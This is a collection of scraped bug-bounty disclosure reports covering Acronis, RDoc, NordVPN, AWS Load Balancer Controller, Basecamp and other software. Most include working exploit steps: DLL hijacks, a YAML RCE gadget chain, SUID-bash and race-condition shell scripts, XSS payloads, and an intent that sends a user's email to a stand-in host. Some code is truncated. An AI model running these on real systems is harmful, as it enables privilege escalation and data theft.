Report:  scrapers\reports\1008427.json
Acronis True Image 2021 has a feature to send user feedback or application crash report to Acronis Support staff. report_sender.exe is the binary which manages such functionalities. The application is vulnerable to DLL hijacking attack because it searches for non-existing DLL files in locations which can be controlled by the attacker or normal user thus placing a malicious DLL in one of the folder will result it getting loaded by report_sender.exe with Administrator privileges which can be escalated to SYSTEM privileges thus resulting in a Privilege Escalation.
report_sender.exe looks for the following DLL files and name of any file can be used to exploit the vulnerability.
Every Windows system contains %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder as a value in the User PATH environment variable where report_sender.exe will search for the DLL if not found in the preceding Search order folders. The malicious DLL file can be placed in this folder as normal user has Full control over this folder.
{F1035152}
Even if %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder is not in User PATH environment variable, attacker can add any folder of his choice to the User PATH environment variable as this does not require Administrative permissions.
I created a DLL file which when loaded spawns cmd.exe while giving information as to which application loaded the DLL, path from where the file was loaded, and user privilege. I have attached the DLL file as well as the C++ code to build the DLL below if any necessary changes are to be made.
[ 1 ] - Copy or write the DLL file with any name from the above specified DLL file names in %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder. I chose ubsec.dll in this example.
{F1035153}
[ 2 ] - Go to the Help tab in Acronis True Image and click on Send feedback.
Image F1035539: 3.png 23.90 KiB
[ 3 ] - Fill in the details of the feedback and click on Send.
Image F1035561: 4.png 15.18 KiB
A cmd.exe window will open when report_sender.exe loads the DLL file.
We can see in the title of the cmd.exe window that it was started with Administrator privileges. To confirm, I ran net session command which gives There are no entries in this list output if executed with Administrator privileges and Access denied if executed as a normal user.
Image F1035584: 5.png 18.59 KiB
[ 1 ] - From the Command Prompt that was executed after the DLL was loaded, create a scheduled task by using the Windows built-in schtasks.exe utility.
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
Image F1035585: 6.png 14.42 KiB
[ 2 ] - Run the task created in above step from the elevated Command Prompt.
schtasks /run /I /TN EOP
Image F1035586: 7.png 112.98 KiB
winver.exe can be seen executed as NT AUTHORITY\SYSTEM resulting in SYSTEM privileged code execution.
Attackers gaining privilege to execute commands as Administrator or NT AUTHORITY\SYSTEM.
This attack can also work without any user interaction when report_sender.exe automatically sends crash report.


Report:  scrapers\reports\1010552.json
Acronis True Image 2021 provides a Rescue Media Builder tool which lets the user create a bootable media to recover system if it becomes unbootable.
MediaBuilder.exe is the binary which manages such functionalities. The application is vulnerable to DLL hijacking attack because it searches for a non-existing DLL file named tcmalloc.dll (Google's custom implementation of dynamic memory allocation) in locations which can be controlled by the attacker or normal user thus placing a malicious DLL in one of the folder will result it getting loaded by MediaBuilder.exe with Administrator privileges which can be escalated to SYSTEM privileges thus resulting in Privilege Escalation.
Every Windows system contains %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder as a value in the User PATH environment variable where MediaBuilder.exe will search for the DLL if not found in the preceding Search order folders. The malicious DLL file can be placed in this folder as normal user has Full control over this folder.
Image F1039832: 1.png 19.44 KiB
Even if %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder is not in User PATH environment variable, attacker can add any folder of his choice to the User PATH environment variable as this does not require Administrative permissions.
I created a DLL file which when loaded spawns cmd.exe while giving information as to which application loaded the DLL, path from where the file was loaded, and user privilege. I have attached the DLL file as well as the C++ code to build the DLL below if any necessary changes are to be made.
[ 1 ] - Copy or write the DLL file named tcmalloc.dll which is to be executed in %USERPROFILE%\AppData\Local\Microsoft\WindowsApps folder.
Image F1039839: 2.png 33.53 KiB
[ 2 ] - Got to Tools tab of True Image and open Rescue Media Builder.
Image F1039840: 3.png 41.59 KiB
A cmd.exe window will open when MediaBuilder.exe loads the DLL file.
We can see in the title of the cmd.exe window that it was started with Administrator privileges. To confirm, I ran net session command which gives There are no entries in this list output if executed with Administrator privileges and Access denied if executed as a normal user.
Image F1039842: 4.png 18.69 KiB
[ 1 ] - From the Command Prompt that was executed after the DLL was loaded, create a scheduled task by using the Windows built-in schtasks.exe utility.
schtasks /create /SC WEEKLY /RU "NT AUTHORITY\SYSTEM" /TN EOP /TR C:\Windows\System32\winver.exe /IT /RL HIGHEST
Image F1039843: 5.png 14.42 KiB
[ 2 ] - Run the task created in above step from the elevated Command Prompt.
schtasks /run /I /TN EOP
Image F1039844: 6.png 112.98 KiB
winver.exe can be seen executed as NT AUTHORITY\SYSTEM resulting in SYSTEM privileged code execution.
Attackers gaining privilege to execute commands as Administrator or NT AUTHORITY\SYSTEM.


Report:  scrapers\reports\1075449.json
Acronis True Image has a feature that updates itself with its newer version automatically or manually depending on the user choice. When updating, the software writes log file named %temp%\Acronis\DriverSetup\inst.log with SYSYEM privileges accessible to normal user . This can be escalated to privileged write vulnerability by an attacker to write to files that he does not have permission to leading to Privilege Escalation.
I'm using Acronis True Image Version 2021, Build 32010 and will update it to latest build for demonstration.

Image F1151730: 1.png 13.74 KiB

In this example, I will overwrite C:\Windows\System32\drivers\pci.sys file which cannot be modified by normal user.
[ 1 ] - Delete %temp%\Acronis\DriverSetup if it already exists.
rmdir /S /Q %temp%\Acronis\DriverSetup
Image F1151731: 2.png 5.17 KiB
[ 2 ] - Create empty %temp%\Acronis folder.
mkdir %temp%\Acronis
Image F1151732: 3.png 4.84 KiB
[ 3 ] - Create a symlink from %temp%\Acronis\DriverSetup\inst.log file to C:\Windows\System32\drivers\pci.sys file.
CreateSymlink %temp%\Acronis\DriverSetup\inst.log C:\Windows\System32\drivers\pci.sys
Image F1151733: 4.png 14.17 KiB
[ 4 ] - Go to Account tab in Acronis True Image and click on A new version is available. True Image will begin to download the latest version.

Image F1151734: 5.png 16.78 KiB
Wait for True Image to download new build.

Image F1151735: 6.png 12.78 KiB
[ 5 ] - The installer will open after the download is complete, click on Update in the installer.

Image F1151736: 7.png 16.86 KiB
While installing the new build, setupapp_amd64.exe will write to the log file in %temp%\Acronis\DriverSetup\inst.log with SYSTEM privileges and because of the symlink, pci.sys file will get overwritten.
Image F1151737: 8.png 58.08 KiB
This is the MD5 hash of pci.sys file before the attack.

Image F1151738: 9.png 11.86 KiB
This is the MD5 hash of pci.sys file after the attack.

Image F1151739: 10.png 11.95 KiB
This proves that the content of pci.sys file was overwritten with the content of inst.log file
Windows 10 Home Version 20H2 (OS Build 19042.685)
Acronis True Image Version 2021, Build 32010
Attacker can overwrite any file of his choice without permission. Further, the vulnerability can be escalated to SYSTEM privileged code execution if the content of the file can be controlled.


Report:  scrapers\reports\1083532.json
Acronis True Image 2020 Nonstop Backup Service is created with an executable path that contains spaces and isn't enclosed within quotes this leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges.
See screenshot below.
Image F1166932: acronis_service.png 13.38 KiB
Image F1166937: acronis_exe_fileinfo.png 14.88 KiB
The vunability can be easily exploited by placing a custom executable C:\Program Files (x86)\Common.exe or C:\Program.exe and restarting the computer/service. The executable will be executed with system privileges.
An example code for such application can be creating a new user with Administrator privilegles.
#include <stdlib.h>

Add quotes to the path "C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe" instead of C:\Program Files (x86)\Common Files\Acronis\CDP\afcdpsrv.exe
privilege escalation on the affected system.


Report:  scrapers\reports\1087744.json
The application contains an activity which validates and handles the deep link requests, initiated from a VIEW intent action. The declared schemes include http and https request for the domain shopify.com as well as *.myshopify.com. The path prefixes include mostly subdirectories of the /admin path , thus when a deep link request is created the application routes this request to the corresponding activity of the application.
It was identified that it is possible to bypass the path prefix restrictions by adding appending a "../" to the end of the URI. This results on loading arbitrary urls in the application's Webview, leveraging its Javascript capabilities as well as the EASDK bridge in order to compromise the integrity of the application.
For example in order to access the https://someone.myshopify.com instead of https://someone.myshopify.com/admin/collections in the application's webview, the following intent may be sent:
am start -W -a android.intent.action.VIEW -d "https://ravel17.myshopify.com/admin/collections/../../
The above intent will yield the following result:

Image F1172971: load1.png 142.06 KiB
In order to load an external URL the following steps should be followed:
Image F1173035: Screenshot_2021-01-26_at_5.07.12_PM.png 117.57 KiB
Image F1173036: Screenshot_2021-01-26_at_5.09.40_PM.png 60.94 KiB
Image F1173040: Screenshot_2021-01-26_at_5.11.34_PM.png 137.10 KiB
am start -W -a android.intent.action.VIEW -d "https://TARGET-STORE.myshopify.com/admin/collections/.../oauth/install_custom_app?client_id=....
Image F1173046: load2.png 133.25 KiB
As it is mentioned above besides the Javascript which is enabled for the specific webview, the application adds a javascript interface which is accessed via the instantiation of an EASDK object. Some potential risk (besides phishing attacks which may be considered trivial for the specific case) is showed bellow:
EASDK.redirect("file:///data/data/com.shopify.mobile/shared_prefs/notification_ids.xml")

Image F1173057: sand.png 124.41 KiB
Image F1173073: sand1.png 139.80 KiB


Report:  scrapers\reports\1161401.json
When the victim downloads files in nextcloud.A notification will be triggered. The content of the notification is "Downloaded".This notification is used to remind the user that the download is complete.The pendingintent in this notification is an implicit intent.
At this time a malicious app with "BINDNOTIFICATIONLISTENER_SERVICE" permission can get the pendintent of this notification, because it is an implicit pendintent. Therefore, the malicious app can set the "packageName" and "clipdata" of this pendintent. At this time, the malicious application will inherit the permissions of "com.nextcloud.client".Because nextcloud has contacts permissions. Therefore, malicious applications can read the contacts without applying for the contacts permission.

Image F1262742: contacts.png 961.21 KiB

At the same time, because of the path configuration of fileprovider, the log file in the nextcloud app directory can also be read

Image F1262743: filepath.png 267.64 KiB
The code of this implicit pendingintent is in
"com.owncloud.android.files.services.FileDownloader.notifyDownloadResult(com.owncloud.android.operations.DownloadFileOperation, com.owncloud.android.lib.common.operations.RemoteOperationResult) : void"

Image F1262747: pendingintent.png 1.05 MiB
Steps To Reproduce:
packageName:com.nextcloud.client
versionName:3.15.1
phone:pixel3
AndroidVersion:10
1.install and run "poc.apk"
2.click the button to give the "BINDNOTIFICATIONLISTENER_SERVICE" permission to poc
3.install "com.nextcloud.client.apk" and give contacts permission to nextcloud.
4.Download a file as shown in the video.At this time, the victim's app will trigger a notification
5.run "adb logcat | grep sbn". now you can see the contact stolen by the attacker
Supporting Material/References:
1.read contacts poc video

Video F1262750: nextcloud.mov 39.11 MiB
2.poc.apk
poc.apk (F1262748)
3."com.nextcloud.client.apk"
com.nextcloud.client_3.15.1-30150190_minAPI21(arm64-v8a_armeabi-v7a_x86_x86_64)(nodpi)_apkmirror.com.apk (F1262746)
Any application with notification permission can steal contacts without apply for the contacts permission
To fix this vulnerability, please set the flag of pengingintent to FLAG_IMMUTABLE


Report:  scrapers\reports\1187156.json
XSS is possible in some places because escaping is not enough in the html generation part of RDoc.
https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/markup/to_html.rb#L330
  def gen_url url, text
    scheme, url, id = parse_url url
    if %w[http https link].include?(scheme) and
       url =~ /\.(gif|png|jpg|jpeg|bmp)$/ then
      "<img src=\"#{url}\" />"
    else
      if scheme != 'link' and /\.(?:rb|rdoc|md)\z/i =~ url
        url = url.sub(%r%\A([./]*)(.*)\z%) { "#$1#{$2.tr('.', '_')}.html" }
      end
      text = text.sub %r%^#{scheme}:/*%i, ''
      text = text.sub %r%^[*\^](\d+)$%,   '\1'
      link = "<a#{id} href=\"#{url}\">#{text}</a>"
      link = "<sup>#{link}</sup>" if /"foot/ =~ id
    end
  end
[<script>alert`link text`</script>](a)

HTML containing the following XSS will be generated.
<p><a href="a"><script>alert`link text`</script></a></p>
<p><a href="javascript:alert`javascript_scheme`">click</a></p>
<p><a href="http://"/onmouseover="alert`on_mouse_link`"">onmouseover</a></p>
<p><img src="http://"onerror="alert`link_image`".png" /></p>
https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/markup/to_html.rb#L97
  def handle_RDOCLINK url # :nodoc:
    case url
    when /^rdoc-ref:/
    when /^rdoc-label:/
      text = $'
      text = case text
             when /\Alabel-/    then $'
             when /\Afootmark-/ then $'
             when /\Afoottext-/ then $'
             else                    text
             end
      gen_url url, text
    when /^rdoc-image:/
      "<img src=\"#{$'}\">"
    else
      url =~ /\Ardoc-[a-z]+:/
    end
  end
rdoc-image:"><script>alert(`rdoc-image`)</script>"

<p><img src=""><script>alert(`rdoc-image`)</script>��></p>
<p><a id="path::"><script>alert(`rdoc-label_id`)</script>�� href=�#�>:path::�><script>alert(`rdoc-label_id`)</script>�</a></p>
<p><a id=""><script>alert(`rdoc-label_path`)</script>�� href=�#�>:�><script>alert(`rdoc-label_path`)</script>�</a></p>
<p>�><script>alert(`rdoc-ref`)</script>�</p>
<p>�><script>alert(`rdoc-xxx`)</script>�</p>
https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/markup/to_html_snippet.rb#L168
  def gen_url url, text
    if url =~ /^rdoc-label:([^:]*)(?::(.*))?/ then
      type = "link"
    elsif url =~ /([A-Za-z]+):(.*)/ then
      type = $1
    else
      type = "http"
    end
    if (type == "http" or type == "https" or type == "link") and
       url =~ /\.(gif|png|jpg|jpeg|bmp)$/ then
      ''
    else
      text.sub(%r%^#{type}:/*%, '')
    end
  end
[<img/src="."/onerror=alert("search")>](a)
XSS tag is embedded in js/search_index.js.
["search","","target/search_md.html","","<p><img/src=\".\"/onerror=alert(\"search\")>\n"]
https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/generator/template/darkfish/index.rhtml#L20
<p>This is the API documentation for <%= @title %>.
XSS is possible because @title is not escaped in the template used when RDoc is run by rubygems.
$ gem -v

Build the gem using the attached xss.md and rdoc_xss.gemspec files.
$ gem build rdoc_xss.gemspec

Confirm multiple xss by opening the http://0.0.0.0:8808/doc_root/rdoc_title_xss-0.0.1/ screen in browser.
Image F1291736: rdoc_xss.png 123.56 KiB
XSS may be included if there is a function that generates html with RDoc for a file passed from the external.
One of the XSS attack methods was previously reported to gitlab. ( https://hackerone.com/reports/200693 )
( Probably sanitized by html-pipeline.)


Report:  scrapers\reports\1187477.json
When parsing .rdoc_options used for configuration in RDoc as a YAML file, RCE is possible from Object injection because there are no restrictions on the classes that can be restored.
https://github.com/ruby/rdoc/blob/v6.3.0/lib/rdoc/rdoc.rb#L165
  def load_options
    options_file = File.expand_path '.rdoc_options'
    return RDoc::Options.new unless File.exist? options_file
    RDoc.load_yaml
    begin
      options = YAML.load_file '.rdoc_options'
    rescue Psych::SyntaxError
    end
$ rdoc -v

Create .rdoc_options file. The yaml attack code is based on this article Universal RCE with Ruby YAML.load, https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: date
         method_id: :resolve
$ rdoc

Kernel.system is called and date is executed.
RCE is possible when the rdoc command is executed for a repository received from the external.
I also tried building the gem with the .rdoc_options file.
When running with gem rdoc, the file .rdoc_options doesn't seem to be read and seems safe.
Therefore, it seems that the environment where RCE is actually possible is limited.


Report:  scrapers\reports\1218523.json
The Linux package available in NordVPN's repository is affected by a permission issue in init script and systemd unit files that allows any user on the system to execute arbitrary command as root.
Tested version is the latest available on the repository, which is 3.10.0 and is available at:
https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn_3.10.0-1_amd64.deb
root@debian:/var/cache/apt/archives# sha256sum nordvpn_3.10.0-1_amd64.deb 

Test system is debian 10.
Previous versions are also affected.
The Linux package in the official NordVPN repository ships with the following files:
root@debian:~# dpkg -c /var/cache/apt/archives/nordvpn_3.10.0-1_amd64.deb 

Some of these files are created with unsafe permissions, this allow any user on the system to overwrite them:
-rwxrwxrwx 0/0            2442 2021-04-07 10:15 ./etc/init.d/nordvpn

By overwriting these files, an unprivileged user can trigger the init system to execute arbitrary code as UID 0.
The original service unit shipped with the package is this:
[Unit]

An attacker could override the ExecStart entry to execute arbitrary code. For example, this line creates a SUID bash binary in /tmp:
ExecStart=/usr/bin/bash -c "cp /usr/bin/bash /tmp/evilbash; chmod u+s /tmp/evilbash;"
Commands beginning with # need a privileged account, while commands beginning with $ are executed in the context of the unprivileged attacker.
# wget https://repo.nordvpn.com/deb/nordvpn/debian/pool/main/nordvpn-release_1.0.0_all.deb

# apt-get update

$ ls -la /tmp
$ cat << EOF > /usr/lib/systemd/system/nordvpnd.service

# reboot
$ ls -l /tmp

The attacker can execute arbitrary command as the root user on the system.


Report:  scrapers\reports\1222873.json
In the latest android app ,I created an account in the name of geekysherlock1@gmail.com.
After few activities,deleted the account .
Files containing user emails and tokens still exist.Relevant files not deleted upon deletion of account.
Content of files post deletion of account:
generic_x86:/data/data/com.nextcloud.client/shared_prefs # ls
FirebaseAppHeartBeat.xml WebViewChromiumPrefs.xml com.google.android.gms.appid.xml com.nextcloud.client_preferences.xml migrations.xml variant-emoji-manager.xml
generic_x86:/data/data/com.nextcloud.client/shared_prefs # cat com.nextcloud.client_preferences.xml
<map>

Images folder
generic_x86:/data/data/com.nextcloud.client/shared_prefs # cd /storage/emulated/0/Pictures
generic_x86:/storage/emulated/0/Pictures # ls
2131099731.jpg 2131099732.jpg 2131099733.jpg
This information could be misused as sensitive token related ,images,user related details exist inspite of user account being deleted.


Report:  scrapers\reports\1238017.json
Report Submission Form
When creating an Ingress of class alb, by default, AWS Load Balancer Controller creates a managed SG and attaches it to the created ALB. This SG limits which ports of the ALB are accessible by whom.
An attacker is able to craft another SG that can be used to trick AWS Load Balancer Controller into changing the SG attached to an ALB. This is possible even though the attacker doesn't have permission to modify the ALB or the managed SG and also doesn't have access to the K8s cluster where the Ingress was created.
AWS Load Balancer Controller uses tree tags to associate a SG on AWS to the supposed managed SG created for an ALB: elbv2.k8s.aws/cluster, ingress.k8s.aws/stack, and ingress.k8s.aws/resource. When there are multiple SGs that match the expected tag values, the controller attaches the first one returned by the AWS SDK to the ALB and deletes the other ones. The API call returns SGs sorted by their respective ids.
If a SG is created with the tags expected by AWS Load Balancer Controller and its id is less than the one from the legit SG, the controller deletes the original SG and attaches the one created by the attacker to the ALB. An attacker is now able to manipulate SG rules for the ALB as they please.
version.Info{Major:"1", Minor:"20+", GitVersion:"v1.20.4-eks-6b7464", GitCommit:"6b746440c04cb81db4426842b4ae65c3f7035e53", GitTreeState:"clean", BuildDate:"2021-03-19T19:33:03Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}
AWS Load Balancer Controller v2.2.0
kubectl apply -f https://raw.githubusercontent.com/kubernetes-sigs/aws-alb-ingress-controller/v1.1.9/docs/examples/echoservice/echoserver-namespace.yaml

VPC_ID=vpc-00123456789abcdef
CLUSTER_NAME=kind
NAMESPACED_NAME=echoserver/echoserver
MANAGED_SG_ID=sg-00123456789abcdef
MANAGED_SG_10=$(echo ${MANAGED_SG_ID} | awk '{ print "ibase=16;" toupper(substr($0,4)) }' | bc)
7
8while true
9do
10	UNMANAGED_SG_ID=$(aws ec2 create-security-group --description unmanaged-sg --group-name unmanaged-sg --vpc-id ${VPC_ID} | jq -r .GroupId)
	UNMANAGED_SG_10=$(echo ${UNMANAGED_SG_ID} | awk '{ print "ibase=16;" toupper(substr($0,4)) }' | bc)
	if [ ${UNMANAGED_SG_10} -lt ${MANAGED_SG_10} ]
	then
		break
	fi
	aws ec2 delete-security-group --group-id ${UNMANAGED_SG_ID}
done
aws ec2 create-tags --resources ${UNMANAGED_SG_ID} --tags "Key=elbv2.k8s.aws/cluster,Value=${CLUSTER_NAME}" "Key=ingress.k8s.aws/stack,Value=${NAMESPACED_NAME}" "Key=ingress.k8s.aws/resource,Value=ManagedLBSecurityGroup"
With the environment set, the attacker now should wait or somehow cause AWS Load Balancer Controller to reconcile the target load balancer. The reconciliation is normally triggered when the Ingress resource is modified or when the Pod of the controller restarts or is recreated, like when the Node where the controller was running is drained on a downscale procedure. Without another exploit or with a higher privilege on the account, user interaction is required.
After reconciliation, the load balancer has the malicious security group attached instead of the managed one that was created by the controller. The attacker modifies the SG rules and either gains access to the service or causes a denial of service.
The attacker has access to all ports of the targeted ALB and can possibly gain access to sensitive data from the service behind the load balancer or make calls that would cause some problem. It is also capable of blocking access of legitimate clients to the service, causing a denial of service.


Report:  scrapers\reports\1238482.json
Report Submission Form
The IAM Policy of AWS Load Balancer Controller allows it to modify rules of any SG on the AWS Account. This is legitimately used to manage Security Groups created by the controller when an Ingress resource doesn�t explicit a SG. Annotations can be added to the Ingress to change inbound rules of the managed SG.
An attacker with access to some namespace on a K8s cluster with AWS Load Balancer Controller properly installed and configured, is able to trick the controller into modifying rules of any SG that the attacker is able to tag.
AWS Load Balancer Controller uses three tags to associate a SG on AWS to the supposed managed SG created for an ALB: elbv2.k8s.aws/cluster, ingress.k8s.aws/stack, and ingress.k8s.aws/resource. When there are multiple SGs that match the expected tag values, the controller attaches the first one returned by the AWS SDK to the ALB and deletes the other ones. The API call returns SGs sorted by their respective ids.
If an arbitrary SG is tagged with the values expected by AWS Load Balancer Controller for some Ingress before its creation, as soon the Ingress is created the controller thinks that the targeted SG is a managed one. This allows an attacker to use annotations alb.ingress.kubernetes.io/listen-ports and alb.ingress.kubernetes.io/inbound-cidrs on the Ingress resource to modify inbound rules of unmanaged SGs, what should not be possible.
version.Info{Major:"1", Minor:"20+", GitVersion:"v1.20.4-eks-6b7464", GitCommit:"6b746440c04cb81db4426842b4ae65c3f7035e53", GitTreeState:"clean", BuildDate:"2021-03-19T19:33:03Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}
AWS Load Balancer Controller v2.2.0
VPC_ID=vpc-00123456789abcdef
CLUSTER_NAME=kind
# Developer legitimatly creates a security group to protect some service
UNMANAGED_SG_ID=$(aws ec2 create-security-group --description unmanaged-sg --group-name unmanaged-sg --vpc-id ${VPC_ID} | jq -r .GroupId)
# Attacker tags the unmanaged security group with values expected by the AWS Load Balancer Controller
aws ec2 create-tags --resources ${UNMANAGED_SG_ID} --tags "Key=elbv2.k8s.aws/cluster,Value=${CLUSTER_NAME}" "Key=ingress.k8s.aws/stack,Value=echoserver/echoserver" "Key=ingress.k8s.aws/resource,Value=ManagedLBSecurityGroup"
# Attacker creates an Ingress with a combination of name, namespace, and cluster that matches the tags added to the unmanaged SG
# listen-ports and inbound-cidrs annotations are set with values related to the inbound rule that will be created on the security group
aws eks update-kubeconfig --name ${CLUSTER_NAME}
cat <<- EOF | kubectl apply -f -
14apiVersion: v1
15kind: Service
16metadata:
17  namespace: echoserver
18  name: echoserver
19spec:
20  selector:
21    app: echoserver
22  ports:
23    - name: http
24      protocol: TCP
25      port: 8080
26---
27apiVersion: extensions/v1beta1
28kind: Ingress
29metadata:
30  namespace: echoserver
31  name: echoserver
32  annotations:
33    kubernetes.io/ingress.class: alb
34    alb.ingress.kubernetes.io/target-type: ip
35    alb.ingress.kubernetes.io/listen-ports: '[{"HTTP":22}]'
36    alb.ingress.kubernetes.io/inbound-cidrs: 0.0.0.0/0
37spec:
38  rules:
39    - host: echoserver.example.com
40      http:
41        paths:
42          - backend:
43              serviceName: echoserver
44              servicePort: 8080
EOF
sleep 15
# Inbound rules were created on the unmanaged security group, allowing ingress SSH traffic (TCP Port 22) from anywhere (CIDR 0.0.0.0/0)
aws ec2 describe-security-groups --group-id ${UNMANAGED_SG_ID}
An attacker is capable of gaining access to all network resources protected by some Security Group and is also able to expose critical services to the Internet if they are on a public subnet. A denial of service attack can be performed by blocking traffic of legitimate clients to resources with SGs attached.


Report:  scrapers\reports\1251464.json
The Acronis True Image application has a SUID binary "Acronis True Image" that starts another binary "console" in the same directory. The SUID binary does some checks on "console" before it is run to make sure the correct binary is being run. By using a hardlink to the SUID binary we can coerice it to try and load "console" in a chosen directory we can write to. From this point we can exploit that the SUID binary does not lock "console" whilst it checks if it is valid, we setup a environment where we can replace console at will and try to win a race where we replace the "console" binary after it has been checked but before it has been run. If we win this race we gain code execution as root from an admin account.
first we make the shell command to run
echo "mkfifo myfifo;nc -l 127.0.0.1 8080 < myfifo | /bin/bash -i > myfifo 2>&1" > shell 
now lets make the c program that will run this shell command naming it test.c
#include <stdlib.h>

compile the program
gcc test.c 
run the following python program
import os 
import time 
os.link("/Applications/Acronis True Image.app/Contents/MacOS/Acronis True Image", "./run")
os.link("/Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
lag = 0.01 
while True: 
	os.popen("./run")
	time.sleep(lag)
	os.unlink("./console")
	os.link("./a.out", "./console")
	time.sleep(1.0)
	os.unlink("./console")
	os.link("Applications/Acronis True Image.app/Contents/MacOS/console", "./console")
	lag += 0.01 
	if os.path.exists("./pass"):
		exit()
connect to the root shell
nc 127.0.0.1 8080
Any binaries that are checked for validity should be locked so that they can not be replaced during validation. Additionally if possible the application should verify where it is being run from to try and prevent further symlink attacks.
Local privilege escalation to root.


Report:  scrapers\reports\1274695.json
Burp Suite utilizes an embedded Chrome browser for crawling and scanning web applications. The Chrome instance is launched in headless mode, with remote debugging enabled via the remote-debugging websocket port instead of remote-debugging-pipe. As a result, a known XSS vulnerability in Chrome can be leveraged in combination with a JavaScript port sniffing and ClickJacking attack to compromise the WebSocket GUID for the remote debugging channel. Using the provided remote debugging APIs, it�s possible to trigger a file download to the /Applications/Burp Suite Professional.app/Contents/ directory with a new user.vmoptions file. This will provide the -Xmx5m and -XX:OnOutOfMemoryError=open -a Calculator flags to JVM the next time that Burp Suite is launched. Accordingly, Burp Suite will quickly exhaust the available JVM memory and trigger the supplied OS command.
Based on Google�s security impact guidelines, this issue would typically be considered to have no security impact since Chrome requires additional flags to run (--remote-debugging and --headless) [1]. Additionally, the XSS vector used in this PoC has been public to Chrome since at least 2016 and reported in multiple tickets [2-6]. As a result, we are reporting this as a Burp Suite vulnerability since the named pipe transport could be utilized to mitigate this issue, which is supported by tools like puppeteer (e.g. --remote-debugging-pipe) [7].
See attached video.
To confirm this issue, perform the following steps:
[1] https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/security-labels.md#TOC-Security_Impact-None
[2] https://bugs.chromium.org/p/chromium/issues/detail?id=607939
[3] https://bugs.chromium.org/p/chromium/issues/detail?id=618333
[4] https://bugs.chromium.org/p/chromium/issues/detail?id=619414
[5] https://bugs.chromium.org/p/chromium/issues/detail?id=775527
[6] https://bugs.chromium.org/p/chromium/issues/detail?id=798163
[7] https://github.com/puppeteer/puppeteer/blob/943477cc1eb4b129870142873b3554737d5ef252/src/node/PipeTransport.ts
After successful exploitation an attacker can gain control over victim's computer with the same permissions as the user running the scanner.


Report:  scrapers\reports\1321358.json
When creating an RDoc html documentation, there is a possibility to inject malicious code through file name.
~ $ touch \"\>\<object\ src\=1\ onerror\=\"javascript\:alert\(1\)\;\"\>Controlling\ what\ is\ documented\ here
~ $ ls
"><object src=1 onerror="javascript:alert(1);">Controlling what is documented here

Now, the generated index file has injected javascript code:
...
<li><a href="./"><object src=1 onerror="javascript:alert(1);">Controlling what is documented here.html">&quot;&gt;&lt;object src=1 onerror=&quot;javascript:alert(1);&quot;&gt;Controlling what is documented here</a>

I set to the vulnerability the same severity as CVE-2013-0256 has, since rdoc is widely used on dev/production systems online documentation, etc. An attacker can hide a bad-named-file deep in the project structure to be stealthy. Also, the file can be very tricky-named in documentation list, can contain the real documentation code, and so as not to arouse suspicion for some time.
The injected code can exfiltrate data or install malware on the (user|developer)�s machine, etc.


Report:  scrapers\reports\1343300.json
It was identified that the android com.basecamp.bc3 application, contains a Webview where the loaded URLs are not sanitised properly. As this webview's functionality is extended via javascript interfaces and has the javascript enabled it is possible to inject arbitrary javascript code which will be executed by the application's webview and provide access to the java native code via the class a.a.a.s.g ( which is exposed via the NativeApp).
The following JS Bridges are exposed:
Image F1452715: Screenshot_2021-09-18_at_1.00.48_PM.png 35.85 KiB
Image F1452717: Screenshot_2021-09-18_at_1.02.09_PM.png 36.56 KiB
Image F1452718: Screenshot_2021-09-18_at_1.02.54_PM.png 45.53 KiB
Image F1452720: Screenshot_2021-09-18_at_1.09.14_PM.png 68.46 KiB
Run the following command after replacing the XXXXX with the user id
Example:
Image F1452730: Screenshot_2021-09-18_at_1.25.20_PM.png 5.22 KiB
Command:
$adb shell am start -W -a android.intent.action.VIEW -d 'https://3.basecamp.com/XXXXX/p","advance","---"); /* comment */ window.location.replace("https://example.com?exfiltration="+nativeBridge.getPage().accountName); //'
Observer the HTTP requests of the app:
GET /?exfiltration=USER_EMAIL@gmail.com HTTP/2

Confidentiality, Integrity and availability are all affected from the specific vulnerability as the javascript code can be injected to an already loaded url while additional functionality is added via the exposed javascript interfaces:
Image F1452742: Screenshot_2021-09-18_at_1.43.25_PM.png 73.63 KiB
"Bucket Name:"+nativeBridge.getPage().bucketName + "Title: " + nativeBridge.getPage().title + "User email:" +nativeBridge.getPage().accountName);
Image F1452750: Screenshot_2021-09-18_at_1.48.59_PM.png 151.00 KiB
Image F1452769: Screenshot_2021-09-18_at_2.10.50_PM.png 128.89 KiB


Report:  scrapers\reports\1354444.json
POC :
Description : Outdated Copyright is present @ Welcome to UPchieve! email which is of years "2020"
Impacted Security Property : Integrity
ASVS Categories : Architecture , Design and Threat Modeling
POC email and video : Gmail - Welcome to UPchieve!.pdf and recording-1632912432386.webm
Suggested Remediation : Year mentioned in the copyright should be updated to the current one and at present it is 2021
@thug645
It will create bad branding impression in front of stake holders.


Report:  scrapers\reports\1374318.json
There is a vulnerability that can allow an attacker to spoof the symbolic link and traverse the file system to unintended locations or access arbitrary files. The symbolic link can permit an attacker to read a file that they originally did not have permissions to access and to inject its content to the placed-on-the-web documentation.
$ mkdir test

